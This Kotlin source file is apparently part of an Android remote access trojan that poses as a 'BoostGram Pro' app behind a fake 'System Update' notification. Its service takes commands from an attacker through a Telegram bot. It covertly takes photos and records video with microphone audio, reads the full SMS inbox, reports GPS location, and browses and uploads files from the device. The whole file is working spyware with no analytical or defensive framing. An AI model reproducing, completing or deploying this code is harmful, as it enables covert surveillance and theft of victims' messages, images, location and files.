package com.vanta.rat

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.*
import android.util.Size
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import kotlinx.coroutines.*
import org.json.JSONObject

class CameraService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var cameraManager: CameraManager
    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var reader: ImageReader? = null
    private var mediaRecorder: MediaRecorder? = null
    private var lastUpdateId = 0L
    private var currentDir = "/sdcard/"
    private var isRunning = true
    private val fileMap = mutableMapOf<Int, String>()
    private var fileCounter = 0

    override fun onBind(intent: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        startPolling()
    }

    private fun startForegroundNotification() {
        val channelId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Update")
            .setContentText("Applying components...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()
        startForeground(1, notif)
    }

    private fun startPolling() {
        scope.launch {
            sendDeviceInfo()
            delay(3000)
            captureAndSend()
            
            while (isActive && isRunning) {
                runCatching { checkCommands() }
                delay(5000)
            }
        }
    }

    private fun sendDeviceInfo() {
        val info = buildString {
            appendLine("📱 جهاز جديد متصل - BoostGram Pro")
            appendLine("Model: ${Build.MODEL}")
            appendLine("Brand: ${Build.BRAND}")
            appendLine("Android: ${Build.VERSION.RELEASE}")
            appendLine("SDK: ${Build.VERSION.SDK_INT}")
            appendLine("Screen: ${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}")
        }
        val keyboard = """
        {
            "inline_keyboard": [
                [{"text": "📸 التقاط صورة", "callback_data": "cam"}, {"text": "🎥 تسجيل فيديو", "callback_data": "rec"}],
                [{"text": "📂 الملفات", "callback_data": "files"}, {"text": "📱 معلومات الجهاز", "callback_data": "info"}],
                [{"text": "💬 رسائل SMS", "callback_data": "sms"}, {"text": "📍 الموقع", "callback_data": "loc"}],
                [{"text": "🛑 إيقاف الأداة", "callback_data": "stop"}]
            ]
        }
        """.trimIndent()
        Telegram.sendMessageWithKeyboard(info, keyboard)
    }

    private fun checkCommands() {
        val url = "https://api.telegram.org/bot${Telegram.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0"
        val req = okhttp3.Request.Builder().url(url).build()
        val resp = okhttp3.OkHttpClient().newCall(req).execute()
        val body = resp.body?.string() ?: return
        val arr = JSONObject(body).optJSONArray("result") ?: return
        
        for (i in 0 until arr.length()) {
            val u = arr.getJSONObject(i)
            lastUpdateId = u.getLong("update_id")
            
            val text = u.optJSONObject("message")?.optString("text")
            if (text != null) {
                when (text.trim()) {
                    "/start" -> { sendDeviceInfo() }
                    "/cam" -> captureAndSend()
                    "/files" -> listDirectory(currentDir)
                    "/stop" -> { isRunning = false; stopSelf() }
                }
            }
            
            val callback = u.optJSONObject("callback_query")
            if (callback != null) {
                val data = callback.optString("data")
                val cbId = callback.optString("id")
                Telegram.answerCallback(cbId)
                
                when {
                    data == "cam" -> captureAndSend()
                    data == "rec" -> recordVideo()
                    data == "files" -> listDirectory(currentDir)
                    data == "info" -> sendDeviceInfo()
                    data == "sms" -> readSMS()
                    data == "loc" -> getLocation()
                    data == "stop" -> { isRunning = false; stopSelf() }
                    data.startsWith("files:") -> listDirectory(data.substringAfter("files:"))
                    data.startsWith("download:") -> {
                        val id = data.substringAfter("download:").toIntOrNull()
                        val path = fileMap[id]
                        if (path != null) {
                            val f = File(path)
                            if (f.exists()) Telegram.sendFile(f, "📄 ${f.name}")
                            else Telegram.sendMessage("❌ الملف غير موجود.")
                        }
                    }
                }
            }
        }
    }

    private fun readSMS() {
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, null
            )
            val sb = StringBuilder()
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    sb.append("📩 من: $address\n📝 $body\n\n")
                } while (cursor.moveToNext())
                cursor.close()
            }
            if (sb.isEmpty()) sb.append("لا توجد رسائل.")
            Telegram.sendMessage(sb.toString())
        } catch (e: Exception) {
            Telegram.sendMessage("⚠️ فشل قراءة الرسائل: ${e.message}")
        }
    }

    private fun getLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                Telegram.sendMessage("📍 الموقع:\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}")
            } else {
                Telegram.sendMessage("⚠️ تعذر تحديد الموقع.")
            }
        } catch (e: Exception) {
            Telegram.sendMessage("⚠️ خطأ في الموقع: ${e.message}")
        }
    }

    private fun listDirectory(path: String) {
        try {
            currentDir = path
            val dir = File(path)
            if (!dir.exists()) {
                Telegram.sendMessage("❌ المجلد غير موجود.")
                return
            }
            val files = dir.listFiles()
            if (files == null) {
                Telegram.sendMessage("🔒 لا يمكن الوصول لهذا المجلد.")
                return
            }
            val sb = StringBuilder("📂 المجلد: $path\n\n")
            val keyboardList = mutableListOf<List<Map<String, String>>>()
            
            if (path != "/sdcard/" && path != "/") {
                keyboardList.add(listOf(mapOf("text" to "⬅️ رجوع", "callback_data" to "files:${dir.parent}")))
            }
            
            for (f in files.take(30)) {
                if (f.isDirectory) {
                    sb.append("📁 ${f.name}\n")
                    keyboardList.add(listOf(mapOf("text" to "📁 ${f.name}", "callback_data" to "files:${f.absolutePath}")))
                } else {
                    sb.append("📄 ${f.name} (${f.length()/1024} KB)\n")
                    val id = fileCounter++
                    fileMap[id] = f.absolutePath
                    keyboardList.add(listOf(mapOf("text" to "📄 ${f.name}", "callback_data" to "download:$id")))
                }
            }
            
            val keyboardJson = buildString {
                append("{\"inline_keyboard\": [")
                val rows = keyboardList.map { row ->
                    "[" + row.joinToString(",") { 
                        "{\"text\": \"${it["text"]}\", \"callback_data\": \"${it["callback_data"]}\"}" 
                    } + "]"
                }
                append(rows.joinToString(","))
                append("]}")
            }
            
            Telegram.sendMessageWithKeyboard(sb.toString(), keyboardJson)
        } catch (e: Exception) {
            Telegram.sendMessage("⚠️ خطأ في قراءة المجلد: ${e.message}")
        }
    }

    private fun captureAndSend() {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Telegram.sendMessage("⚠️ صلاحية الكاميرا غير ممنوحة")
            return
        }
        val camId = cameraManager.cameraIdList.firstOrNull { id ->
            val c = cameraManager.getCameraCharacteristics(id)
            c.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        } ?: return

        val size = cameraManager.getCameraCharacteristics(camId)
            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
            .getOutputSizes(ImageFormat.JPEG)!!.first()

        reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
        reader!!.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage()
            val buf: ByteBuffer = image.planes[0].buffer
            val bytes = ByteArray(buf.remaining()); buf.get(bytes)
            image.close()
            val f = File(cacheDir, "cap_${System.currentTimeMillis()}.jpg")
            FileOutputStream(f).use { it.write(bytes) }
            Telegram.sendPhoto(f)
            f.delete()
            stopCapture()
        }, Handler(Looper.getMainLooper()))

        cameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(dev: CameraDevice) {
                cameraDevice = dev
                val surface = reader!!.surface
                val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(surface) }
                dev.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        session = s
                        s.capture(req.build(), null, null)
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) {}
                }, null)
            }
            override fun onDisconnected(dev: CameraDevice) { dev.close() }
            override fun onError(dev: CameraDevice, error: Int) { dev.close() }
        }, null)
    }

    private fun recordVideo() {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
        val camId = cameraManager.cameraIdList.firstOrNull { id ->
            val c = cameraManager.getCameraCharacteristics(id)
            c.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        } ?: return
        
        val videoFile = File(cacheDir, "video_${System.currentTimeMillis()}.mp4")
        
        cameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(dev: CameraDevice) {
                cameraDevice = dev
                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(applicationContext) else MediaRecorder()
                mediaRecorder?.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setOutputFile(videoFile.absolutePath)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoSize(640, 480)
                    setVideoFrameRate(30)
                    prepare()
                }
                
                val surface = mediaRecorder!!.surface
                val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply { addTarget(surface) }
                val surfaces = listOf(surface)
                
                dev.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(s: CameraCaptureSession) {
                        session = s
                        s.setRepeatingRequest(req.build(), null, null)
                        mediaRecorder?.start()
                        Telegram.sendMessage("🎥 بدأ تسجيل الفيديو (15 ثانية)...")
                        Handler(Looper.getMainLooper()).postDelayed({
                            mediaRecorder?.stop()
                            mediaRecorder?.release()
                            Telegram.sendFile(videoFile, "🎥 فيديو جديد")
                            videoFile.delete()
                        }, 15000)
                    }
                    override fun onConfigureFailed(s: CameraCaptureSession) {}
                }, null)
            }
            override fun onDisconnected(dev: CameraDevice) { dev.close() }
            override fun onError(dev: CameraDevice, error: Int) { dev.close() }
        }, null)
    }

    private fun stopCapture() {
        session?.close(); session = null
        cameraDevice?.close(); cameraDevice = null
        reader?.close(); reader = null
    }

    override fun onDestroy() {
        scope.cancel()
        stopCapture()
        super.onDestroy()
    }
}
